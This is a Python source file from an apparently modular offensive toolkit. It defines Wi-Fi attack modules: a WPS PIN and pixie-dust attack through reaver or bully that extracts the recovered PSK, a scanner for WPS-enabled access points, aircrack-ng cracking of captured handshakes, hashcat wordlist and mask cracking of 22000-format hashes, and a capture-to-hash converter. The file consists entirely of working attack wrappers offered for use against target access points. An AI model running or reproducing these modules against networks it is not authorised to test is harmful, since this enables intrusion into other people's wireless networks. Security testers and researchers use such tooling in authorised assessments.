"""WPS attacks and cracking (aircrack / hashcat)."""

from __future__ import annotations

from omni.core import console
from omni.core.module import Option
from omni.wifi import capture as cap
from omni.wifi import crack as crack_mod
from omni.wifi.modules._base import WifiModule


class Wps(WifiModule):
    NAME = "wifi.wps"
    DESCRIPTION = "WPS PIN / pixie-dust attack (reaver or bully)"
    NEEDS = ("reaver",)
    OPTIONS = (Option("BSSID", "access point MAC", "", required=True),
               Option("PIN", "known WPS pin (blank = pixie dust)"),
               Option("TOOL", "reaver|bully", "reaver",
                      choices=("reaver", "bully")),
               Option("IFACE", "monitor interface (auto)"))

    def execute(self) -> dict:
        if self.get("TOOL") == "bully":
            mon = self.monitor()
        else:
            mon = self.monitor()
        res = cap.wps_pin(mon, self.get("BSSID"), self.get("PIN") or None,
                          self.get("TOOL"))
        text = res.text
        console.info(text.splitlines()[-1] if text else "no output")
        psk = ""
        for line in text.splitlines():
            low = line.lower()
            if "wpa psk" in low or "pin:" in low and "psk" not in low:
                psk = line.split(":", 1)[-1].strip()
        if psk:
            console.ok(f"recovered: {psk}")
        return {"ok": res.ok, "psk": psk, "bssid": self.get("BSSID")}


class WpsScan(WifiModule):
    NAME = "wifi.wpsscan"
    DESCRIPTION = "List WPS-enabled APs and their lock state (wash)"
    NEEDS = ("wash",)
    OPTIONS = (Option("BSSID", "only report this MAC (blank = all)"),)

    def execute(self) -> dict:
        out = cap.wps_lock_check(self.get("BSSID"))
        console.table(["bssid", "ch", "rssi", "version", "locked"],
                      [[r["bssid"], r["channel"], r["rssi"],
                        r["wps_version"], r["locked"]] for r in out["rows"]])
        return out


class Crack(WifiModule):
    NAME = "wifi.crack"
    DESCRIPTION = "Crack a captured handshake with aircrack-ng"
    NEEDS = ("aircrack-ng",)
    OPTIONS = (Option("PCAP", "capture file", "", required=True),
               Option("WORDLIST", "wordlist path (blank = config default)"),
               Option("BSSID", "target AP MAC"),
               Option("ESSID", "target ESSID"))

    def execute(self) -> dict:
        out = crack_mod.aircrack(self.get("PCAP"), self.get("WORDLIST") or None,
                                 self.get("BSSID") or None,
                                 self.get("ESSID") or None)
        if out["found"]:
            console.ok(f"KEY FOUND: {out['key']}")
        else:
            console.warn("key not in wordlist")
            for line in out["tail"]:
                console.debug(line)
        return out


class Hashcat(WifiModule):
    NAME = "wifi.hashcat"
    DESCRIPTION = "Crack a 22000 hashfile with hashcat (GPU/CPU)"
    OPTIONS = (Option("HASHFILE", "22000 hash file", "", required=True),
               Option("WORDLIST", "wordlist path"),
               Option("MASK", "mask instead of a wordlist (e.g. ?d?d?d?d?d?d?d?d)"))

    def execute(self) -> dict:
        if self.get("MASK"):
            outdir_mask = ["-a", "3"]
            size = crack_mod.mask_candidates(self.get("MASK"))
            console.info(f"mask keyspace: {size:,}")
            res = crack_mod.hashcat(self.get("HASHFILE"), self.get("MASK"),
                                    extra=outdir_mask)
        else:
            res = crack_mod.hashcat(self.get("HASHFILE"),
                                    self.get("WORDLIST") or None)
        if res["found"]:
            console.ok("recovered: " + ", ".join(res["keys"]))
        else:
            console.warn("not recovered")
        return res


class Convert(WifiModule):
    NAME = "wifi.convert"
    DESCRIPTION = "Convert a capture to hashcat 22000 format"
    NEEDS = ("hcxpcapngtool",)
    OPTIONS = (Option("PCAP", "pcap/pcapng file", "", required=True),
               Option("OUT", "output path (blank = alongside the capture)"))

    def execute(self) -> dict:
        out = crack_mod.to_22000(self.get("PCAP"), self.get("OUT") or None)
        if out:
            console.ok(f"wrote {out}")
        else:
            console.warn("conversion produced nothing (no handshake/PMKID?)")
        return {"hashfile": out}
